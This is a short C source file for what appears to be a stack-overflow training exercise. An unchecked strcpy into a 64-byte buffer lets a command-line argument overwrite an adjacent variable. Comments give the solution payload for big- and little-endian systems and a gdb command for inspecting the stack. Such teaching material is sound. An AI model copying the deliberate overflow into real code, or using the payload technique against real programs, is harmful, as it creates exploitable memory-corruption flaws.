#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
// solution big endian system:
// ./stackOne $(python -c "print '~'*(76) + 'dcba'")
// solution little endian system:
// ./stackOne $(python -c "print '~'*(76) + 'abcd'")
// examine stack in gdb: 
// x/24wx $rsp
int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
